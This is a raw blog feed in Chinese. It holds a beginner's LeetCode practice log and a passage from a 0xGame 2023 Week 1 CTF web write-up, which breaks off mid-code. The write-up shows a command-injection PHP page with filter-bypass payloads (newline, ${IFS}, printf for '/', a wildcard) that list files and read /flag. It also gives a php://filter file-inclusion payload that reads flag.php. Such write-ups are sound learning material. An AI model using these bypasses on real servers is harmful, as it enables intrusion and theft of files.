    <content type="html"><![CDATA[<p>代码能力太差了，在leetCode上做点简单的题。记录一下😀</p><span id="more"></span><hr><p>代码能力完全是入门级别。。只会写点异常简单的东西，准备做点题提升下能力。</p><p>在做题过程中，我会尽可能使用我接触过的<code>python</code>,<code>java</code>,<code>c++</code>来解题。</p><p>当然，“尽可能”，写不写的出来就是另外一回事了</p><h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1.两数之和"></a>1.两数之和</h2><p>描述：给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> <em><code>target</code></em> 的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><p>思路就是遍历给定数组中的每个元素，让他们都加一遍，两数之和进<code>if</code>条件判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">twoSum</span>(<span class="hljs-params">self, nums, target</span>):<br>        listlen = <span class="hljs-built_in">len</span>(nums)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(listlen):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(listlen):<br>                <span class="hljs-keyword">if</span> nums[i] + nums[j] == target:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Answer: <span class="hljs-subst">&#123;i&#125;</span>, <span class="hljs-subst">&#123;j&#125;</span>!&quot;</span>)<br><br>nums = [<span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>]<br>target = <span class="hljs-number">9</span><br><br>solution = Solution()<br>solution.twoSum(nums, target)<br>                <br><span class="hljs-comment"># 输出：Answer: 0, 1!</span><br><span class="hljs-comment">#      Answer: 1, 0!</span><br></code></pre></td></tr></table></figure><p><code>java</code>的不会写~直接看了官方答案：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] twoSum(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> target) &#123;<span class="hljs-comment">//定义了一个twoSum方法，返回类型为int[],该方法接受一个整数数组nums和一个整数目标值target作为参数</span><br>     <span class="hljs-comment">//java定义方法：访问修饰符 返回类型 方法名(参数列表)</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.length;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<span class="hljs-comment">//for (初始化语句; 循环条件; 更新语句)，++i是前缀自增</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> i + <span class="hljs-number">1</span>; j &lt; n; ++j) &#123;<br>                <span class="hljs-keyword">if</span> (nums[i] + nums[j] == target) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;i, j&#125;;<span class="hljs-comment">//花括号创建数组</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">0</span>];<span class="hljs-comment">//假如找不到会返回一个空的整数数组</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//https://leetcode.cn/problems/two-sum/</span><br><br></code></pre></td></tr></table></figure><h2 id="2-无重复字符的最长字串"><a href="#2-无重复字符的最长字串" class="headerlink" title="2.无重复字符的最长字串"></a>2.无重复字符的最长字串</h2><p>做题感受：我是SB</p><p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">length_of_longest_substring</span>(<span class="hljs-params">s</span>):<br>    char_dict = &#123;&#125;  <span class="hljs-comment"># 记录每个字符最后一次出现的索引位置</span><br>    start = <span class="hljs-number">0</span>  <span class="hljs-comment"># 子串的起始位置</span><br>    end = <span class="hljs-number">0</span>  <span class="hljs-comment"># 子串的结束位置</span><br>    max_length = <span class="hljs-number">0</span>  <span class="hljs-comment"># 最长子串的长度</span><br><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(s):<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> char_dict <span class="hljs-keyword">and</span> char_dict[char] &gt;= start:<br>            start = char_dict[char] + <span class="hljs-number">1</span><br>        end = i<br>        char_dict[char] = i<br>        max_length = <span class="hljs-built_in">max</span>(max_length, end - start + <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> max_length<br><br></code></pre></td></tr></table></figure><h2 id="3-计算列车到站时间"><a href="#3-计算列车到站时间" class="headerlink" title="3.计算列车到站时间"></a>3.计算列车到站时间</h2><p>给你一个正整数 <code>arrivalTime</code> 表示列车正点到站的时间（单位：小时），另给你一个正整数 <code>delayedTime</code> 表示列车延误的小时数。</p><p>返回列车实际到站的时间。</p><p>注意，该问题中的时间采用 24 小时制。</p><p>思路就是求和取模</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getReal</span>(<span class="hljs-params">self</span>):<br>        arrivalTime = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入列车正点到站时间：&quot;</span>))<br>        delayedTime = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入列车延误的小时数：&quot;</span>))<br>        realTime = (arrivalTime + delayedTime) % <span class="hljs-number">24</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;列车本该在<span class="hljs-subst">&#123;arrivalTime&#125;</span>点到站，但延误了<span class="hljs-subst">&#123;delayedTime&#125;</span>小时，所以实际到站时间为<span class="hljs-subst">&#123;realTime&#125;</span>点!&quot;</span>)<br><br><span class="hljs-comment"># 实例化Solution类</span><br>solution = Solution()<br><span class="hljs-comment"># 调用getReal方法</span><br>solution.getReal()<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//java</span><br><span class="hljs-comment">//Main.java</span><br><br><span class="hljs-keyword">import</span> java.util.Scanner;  <span class="hljs-comment">//利用Scanner类读取输入</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <span class="hljs-comment">//类与文件名保持一致</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<span class="hljs-comment">//创建了一个名为scanner的Scanner对象，并将其初始化为从标准输入流（System.in）中读取数据</span><br><br>        System.out.print(<span class="hljs-string">&quot;请输入列车正点到站时间：&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">arrivalTime</span> <span class="hljs-operator">=</span> scanner.nextInt();<br><br>        System.out.print(<span class="hljs-string">&quot;请输入列车延误的小时数：&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">delayedTime</span> <span class="hljs-operator">=</span> scanner.nextInt();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">realTime</span> <span class="hljs-operator">=</span> (arrivalTime + delayedTime) % <span class="hljs-number">24</span>;<br>        System.out.println(<span class="hljs-string">&quot;列车本该在&quot;</span> + arrivalTime + <span class="hljs-string">&quot;点到站，但延误了&quot;</span> + delayedTime + <span class="hljs-string">&quot;小时，所以实际到站时间为&quot;</span> + realTime + <span class="hljs-string">&quot;点!&quot;</span>);<br><br>        scanner.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="4-罗马数字转整数"><a href="#4-罗马数字转整数" class="headerlink" title="4.罗马数字转整数"></a>4.罗马数字转整数</h2><p>罗马数字包含以下七种字符: <code>I</code>， <code>V</code>， <code>X</code>， <code>L</code>，<code>C</code>，<code>D</code> 和 <code>M</code>。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">字符          数值<br><span class="hljs-built_in">I</span>             <span class="hljs-number">1</span><br><span class="hljs-variable">V</span>             <span class="hljs-number">5</span><br><span class="hljs-variable">X</span>             <span class="hljs-number">10</span><br><span class="hljs-variable">L</span>             <span class="hljs-number">50</span><br><span class="hljs-built_in">C</span>             <span class="hljs-number">100</span><br><span class="hljs-built_in">D</span>             <span class="hljs-number">500</span><br><span class="hljs-variable">M</span>             <span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p>例如， 罗马数字 <code>2</code> 写做 <code>II</code> ，即为两个并列的 1 。<code>12</code> 写做 <code>XII</code> ，即为 <code>X</code> + <code>II</code> 。 <code>27</code> 写做 <code>XXVII</code>, 即为 <code>XX</code> + <code>V</code> + <code>II</code> 。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 <code>IIII</code>，而是 <code>IV</code>。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 <code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code> 可以放在 <code>V</code> (5) 和 <code>X</code> (10) 的左边，来表示 4 和 9。</li><li><code>X</code> 可以放在 <code>L</code> (50) 和 <code>C</code> (100) 的左边，来表示 40 和 90。 </li><li><code>C</code> 可以放在 <code>D</code> (500) 和 <code>M</code> (1000) 的左边，来表示 400 和 900。</li></ul><p>给定一个罗马数字，将其转换成整数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">romanToInt</span>(<span class="hljs-params">self, luoma</span>):<br>        roman_map = &#123;<span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-number">500</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-number">1000</span>&#125;<br>        result = <span class="hljs-number">0</span><br>        prev_value = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> luoma:<br>            value = roman_map[char]<br>            <span class="hljs-keyword">if</span> value &gt; prev_value:<br>                result += value - <span class="hljs-number">2</span> * prev_value<br>            <span class="hljs-keyword">else</span>:<br>                result += value<br>            prev_value = value<br>        <span class="hljs-keyword">return</span> result<br><br>s = Solution()<br>input_roman = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个罗马数字：&quot;</span>)<br><span class="hljs-built_in">print</span>(s.romanToInt(input_roman))<br><br></code></pre></td></tr></table></figure><h2 id="5-回文数"><a href="#5-回文数" class="headerlink" title="5.回文数"></a>5.回文数</h2><p>给你一个整数 <code>x</code> ，如果 <code>x</code> 是一个回文整数，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p><p>回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p><ul><li>例如，<code>121</code> 是回文，而 <code>123</code> 不是。</li></ul><p>思路就是先把数字转换成字符串，然后计算长度利用切片分别返回正序倒序的结果。判断是否相等然后输出。</p><p>一开始还是想利用<code>input</code>函数提示用户输入，然后利用<code>Int</code>转换为整数，再利用<code>str</code>转成字符串，后来觉得没任何必要。。直接<code>number = input(&quot;请输入一个数字。我会判断是不是回文数：&quot;)</code>就行。然后利用<code>len</code>函数计算字符串长度，再利用切片去看正序倒序结果，<code>if</code>判断然后输入就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_it</span>(<span class="hljs-params">self,num</span>):<br>        zhengxv = num[::]<br>        daoxv = num[::-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> zhengxv == daoxv:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num&#125;</span>是一个回文数&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num&#125;</span>不是一个回文数&quot;</span>)<br>            <br>s = Solution()<br>num =  <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个数字。我会判断是不是回文数：&quot;</span>)<br><span class="hljs-built_in">print</span>(s.check_it(num))<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check_it</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">numStr</span> <span class="hljs-operator">=</span> String.valueOf(num);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">reverseNumStr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(numStr).reverse().toString();<br>        <span class="hljs-keyword">if</span> (numStr.equals(reverseNumStr)) &#123;<br>            System.out.println(num + <span class="hljs-string">&quot; 是一个回文数&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(num + <span class="hljs-string">&quot; 不是一个回文数&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Solution</span> <span class="hljs-variable">solution</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Solution</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">12321</span>; <br>        solution.check_it(num);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week1</title>
    <link href="/2023/09/18/ko1/"/>
    <url>/2023/09/18/ko1/</url>
    
    <content type="html"><![CDATA[<p>菜鸟的Write_up，只接触过web</p><span id="more"></span><h1 id="web部分"><a href="#web部分" class="headerlink" title="web部分"></a>web部分</h1><h3 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h3><p>根据题目想到可能是RCE：</p><p><img src="/img/ping1.png" alt="ping1"></p><p>看下源码发现提示：<code>&lt;!-- visit &#39;/api.php?source&#39; for hint --&gt;</code>,访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//;过滤可以用其它分隔符绕过，比如&amp;&amp;啥的</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//空格过滤可以用$&#123;IFS&#125;啥的绕过</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">// /过滤可以用反引号和printf配合绕过：`printf$&#123;IFS&#125;&quot;\57&quot;`</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//flag被过滤可以用通配符*绕过：fl*</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;                      <br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<span class="hljs-comment">//POST传IP</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">//对传过去的ip进行过滤</span><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<span class="hljs-comment">//正则匹配IPv4地址的格式，可以用换行符%0a绕过</span><br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);  <span class="hljs-comment">//命令执行</span><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>先利用ls看看当前目录下都有啥东西：</p><p><code>ip=127.0.0.1%0als</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">api<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.html</span><br>simple.css<br></code></pre></td></tr></table></figure><p>去根目录看看：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>als<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`<br><span class="hljs-attribute">bin</span><br><span class="hljs-attribute">boot</span><br><span class="hljs-attribute">dev</span><br><span class="hljs-attribute">etc</span><br><span class="hljs-attribute">flag</span><br></code></pre></td></tr></table></figure><p>cat读&#x2F;flag的内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>acat<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`fl*<br></code></pre></td></tr></table></figure><p>flag：0xGame{19c71976-d7d8-4ab8-9ea5-6ea3800f59f6}</p><h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-comment">//GET传a和b,POST传c,COOKIE超全局变量中name对应$name</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123; <span class="hljs-comment">//md5加密数组会返回null，null==null成立</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//c不能是个数字，可以在任意数字后加个字母达到目的</span><br>        &#125;                          <span class="hljs-comment">//c不能等于1024，结合后面的intval函数想到利用小数绕过，intval一个小数并不会遵循四舍五入原则</span><br>    &#125;                              <span class="hljs-comment">//提示flag在flag.php中，文件包含漏洞。因为后面会加.php所以直接传flag看看情况</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>综上：</p><p>GET<code>?a[]=1&amp;b[]=2</code>POST<code>c=1024.9a</code>并且<code>Cookie: name=flag</code></p><p>没反应，试了试目录穿越也没结果。想到用伪协议读flag.php：</p><p><code>Cookie: name=php://filter/convert.base64-encode/resource=flag</code></p><p>得到一串base64:</p><p><code>PD9waHAKCiRmbGFnID0gJzB4R2FtZXs0M2JiM2UyNC0wODI0LTQ4Y2ItOTVkMC1jNDcxNTQwYzA5NTN9JzsKCj8</code></p><p>解个码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;</span>;<br><br><span 